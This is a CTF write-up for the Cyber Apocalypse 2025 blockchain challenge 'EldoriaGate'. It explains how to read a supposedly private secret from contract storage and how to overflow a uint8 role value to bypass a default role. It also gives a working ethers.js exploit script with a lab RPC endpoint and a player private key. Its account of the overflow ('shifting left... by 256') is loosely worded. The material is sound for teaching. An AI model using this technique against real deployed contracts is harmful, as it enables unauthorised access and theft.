---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | EldoriaGate Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: blockchain
challenge: EldoriaGate
tags: "blockchain, starry, ethers"
date: 2025-03-29T00:00:00+00:00
last_update: 2025-03-29T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2025</h1>

## EldoriaGate
> Solved by Starry-Lord


    contract EldoriaGateKernel {
        bytes4 private eldoriaSecret;
        ...
    }

First I thought we needed to Bruteforce the secret, but then I realised the value was getting stored on-chain, and as we all know, on-chain storage is public [**😉**](https://emojipedia.org/winking-face), so we could just extract it from the creation of the contract’s transaction.

Since it’s the first declared variable, it is stored at slot 0 on the EldorianGateKernel contract address.

With that we managed to authenticate, but we still needed to become the “Usurper” which is basically not receiving any role, but the contract assigne the ROLE_SERF by default:


    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
                ...
                let defaultRolesMask := ROLE_SERF
                roles := add(defaultRolesMask, _contribution)
                if lt(roles, defaultRolesMask) { revert(0, 0) }
                ...
        }

But we can break it by passing the contribution value 255, which is an 8-bit value. The key here is that shifting left an 8-bit value by 256 brings us back to 0, thus allowing us to not get a default role:


    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
            assembly {
                mstore(0x00, _unknown)
                mstore(0x20, villagers.slot)
                let villagerSlot := keccak256(0x00, 0x40)
                mstore(0x00, _unknown)
                id := keccak256(0x00, 0x20)
                sstore(villagerSlot, id)
                let storedPacked := sload(add(villagerSlot, 1))
                let storedAuth := and(storedPacked, 0xff)
                if iszero(storedAuth) { revert(0, 0) }
                let defaultRolesMask := ROLE_SERF
                roles := add(defaultRolesMask, _contribution)
                if lt(roles, defaultRolesMask) { revert(0, 0) }
                let packed := or(storedAuth, shl(8, roles))
                sstore(add(villagerSlot, 1), packed)
        }
    }

solve.js with ethers.js v5:


    const { ethers } = require("ethers");
    
    const RPC_URL = "http://94.237.58.78:50156";
    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    
    // CONFIGURATION
    const TARGET_ADDRESS = "0x89B1908C814588a24269cD14409ba6b4B15a709B"; // EldoriaGate
    const PLAYER_PRIVATE_KEY = "0x63ddf21f62799265b687cd70c91065c94b75aa8b9aab40d2f122c14dc0513c32";
    
    // CONTRACT ABIs
    const EldoriaGateABI = [
      "function enter(bytes4 passphrase) external payable",
      "function kernel() public view returns (address)"
    ];
    
    // Setup
    const player = new ethers.Wallet(PLAYER_PRIVATE_KEY, provider);
    const gate = new ethers.Contract(TARGET_ADDRESS, EldoriaGateABI, player);
    
    async function main() {
      console.log("[*] Getting EldoriaGateKernel address...");
      const kernelAddress = await gate.kernel();
      console.log("[+] Kernel address:", kernelAddress);
    
      console.log("[*] Reading storage slot 0 from kernel...");
      const rawSlot = await provider.getStorageAt(kernelAddress, 0);
      console.log("[+] Raw slot 0 data:", rawSlot);
    
      // Extract last 4 bytes (right-aligned)
      const guess = "0x" + rawSlot.slice(66 - 8);
      console.log("[+] Interpreted eldoriaSecret:", guess);
    
      console.log("[*] Attempting to call enter() with secret...");
    
      try {
        const tx = await gate.enter(guess, { value: 255 });
        await tx.wait();
        console.log(`\n🎉 [SUCCESS] Authentication passed with secret: ${guess}`);
      } catch (err) {
        const reason = err?.error?.message || err?.reason || "Unknown error";
        console.log(`\n[x] enter(${guess}) failed: ${reason}`);
      }
    }
    
    main().catch(console.error);
    


![](https://i.imgur.com/7P2f4OD.png)


